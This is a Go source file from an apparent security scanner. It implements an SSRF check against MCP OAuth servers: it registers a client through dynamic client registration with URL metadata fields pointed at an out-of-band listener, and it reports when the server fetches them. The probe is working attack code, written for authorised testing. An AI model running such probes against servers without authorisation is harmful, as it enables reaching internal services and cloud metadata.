package mcp

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/calbebop/batesian/internal/attack"
	"github.com/calbebop/batesian/internal/oob"
)

// OAuthMetadataSSRFExecutor tests whether an MCP OAuth server fetches
// registrant-supplied URL metadata during dynamic client registration, enabling
// SSRF (rule mcp-oauth-metadata-ssrf-001). It registers a client whose URL fields
// point at the Batesian OOB listener and confirms only when the server actually
// calls back.
type OAuthMetadataSSRFExecutor struct {
	rule attack.RuleContext
}

func init() {
	attack.Register("mcp-oauth-metadata-ssrf", func(rc attack.RuleContext) attack.Executor {
		return NewOAuthMetadataSSRFExecutor(rc)
	})
}

func NewOAuthMetadataSSRFExecutor(r attack.RuleContext) *OAuthMetadataSSRFExecutor {
	return &OAuthMetadataSSRFExecutor{rule: r}
}

// urlMetadataFields are the RFC 7591 client-metadata fields whose values are
// URLs a server might fetch. Each is seeded with a distinct marker path so an
// OOB callback identifies which field was fetched.
var urlMetadataFields = []string{"jwks_uri", "sector_identifier_uri", "logo_uri", "client_uri", "policy_uri", "tos_uri"}

func (e *OAuthMetadataSSRFExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)
	client := attack.NewHTTPClient(opts, vars)

	registrationEndpoint, ok := e.discoverRegistrationEndpoint(ctx, client, vars.BaseURL)
	if !ok {
		// The server advertises no OAuth DCR, which is not applicable rather than
		// clean only if the server answered at all.
		return nil, oauthNotApplicable(ctx, client, vars.BaseURL)
	}

	// Resolve the OOB listener (external if provided, else a local one).
	listenerURL := opts.OOBListenerURL
	var listener *oob.Listener
	if listenerURL == "" {
		if opts.DryRun {
			// A dry run must bind no socket; preview against a non-resolving
			// placeholder so the recorded plan still shows the seeded URLs.
			listenerURL = attack.DryRunOOBPlaceholderURL
		} else {
			listener = oob.New()
			var err error
			listenerURL, err = listener.Start()
			if err != nil {
				return nil, fmt.Errorf("oauth-metadata-ssrf: starting OOB listener: %w", err)
			}
			defer func() {
				stopCtx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
				defer cancel()
				_ = listener.Stop(stopCtx)
			}()
		}
	}

	// Build a registration whose URL metadata fields all target the OOB listener,
	// each with a field-specific marker path.
	body := map[string]interface{}{
		"client_name":    "batesian-ssrf-" + vars.RandID,
		"redirect_uris":  []string{"https://batesian.invalid/callback"},
		"grant_types":    []string{"authorization_code"},
		"response_types": []string{"code"},
	}
	markerFor := map[string]string{}
	for _, field := range urlMetadataFields {
		marker := "/batesian-" + vars.RandID + "/" + field
		markerFor[marker] = field
		body[field] = listenerURL + marker
	}

	unauthClient := attack.NewUnauthHTTPClient(opts, vars)
	resp, err := unauthClient.POST(ctx, registrationEndpoint, nil, body)
	if err != nil {
		return nil, fmt.Errorf("oauth-metadata-ssrf: DCR registration failed: %w", err)
	}

	if listener == nil {
		// External OOB: we cannot observe the callback ourselves.
		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			return []attack.Finding{{
				RuleID:     e.rule.ID,
				RuleName:   e.rule.Name,
				Severity:   "info",
				Confidence: attack.RiskIndicator,
				Title:      "MCP OAuth DCR accepted registrant-supplied metadata URLs (verify SSRF via your OOB server)",
				Description: fmt.Sprintf("The registration endpoint at %s accepted a client registration whose URL "+
					"metadata fields pointed at %s. Check your OOB server for inbound requests to the marker paths to "+
					"confirm a metadata-fetch SSRF.", registrationEndpoint, listenerURL),
				Evidence:    fmt.Sprintf("Registration endpoint: %s\nMarker base: %s\nFields seeded: %v", registrationEndpoint, listenerURL, urlMetadataFields),
				Remediation: e.rule.Remediation,
				TargetURL:   registrationEndpoint,
			}}, nil
		}
		return nil, nil
	}

	// Local OOB: wait for the server to fetch one of the seeded URLs.
	cb, received := listener.WaitForMarker(ctx, 10*time.Second, "batesian-"+vars.RandID)
	if !received {
		return nil, nil
	}
	field := matchMarker(cb.URL, markerFor)
	return []attack.Finding{{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   "high",
		Confidence: attack.ConfirmedExploit,
		Title:      "MCP OAuth server fetched an attacker-controlled DCR metadata URL (SSRF)",
		Description: fmt.Sprintf("The OAuth server at %s made an outbound request to a registrant-supplied metadata "+
			"URL (field %q) during dynamic client registration. A registrant can point this field at internal "+
			"services, cloud metadata endpoints, or other private resources, so the OAuth discovery chain is an SSRF "+
			"vector.", registrationEndpoint, field),
		Evidence: fmt.Sprintf("Registration endpoint: %s\nOOB callback: %s %s\nFetched field: %s",
			registrationEndpoint, cb.Method, cb.URL, field),
		Remediation: e.rule.Remediation,
		TargetURL:   registrationEndpoint,
	}}, nil
}

func (e *OAuthMetadataSSRFExecutor) discoverRegistrationEndpoint(ctx context.Context, client *attack.HTTPClient, baseURL string) (string, bool) {
	for _, ep := range []string{
		baseURL + "/.well-known/oauth-authorization-server",
		baseURL + "/.well-known/openid-configuration",
	} {
		resp, err := client.GET(ctx, ep, nil)
		if err != nil || !resp.IsSuccess() {
			continue
		}
		if reg := resp.JSONField("registration_endpoint"); reg != "" {
			return reg, true
		}
	}
	return "", false
}

// matchMarker returns the metadata field whose marker path is a prefix of the
// callback URL, or "unknown" if none matched.
func matchMarker(callbackURL string, markerFor map[string]string) string {
	for marker, field := range markerFor {
		if strings.Contains(callbackURL, marker) {
			return field
		}
	}
	return "unknown"
}
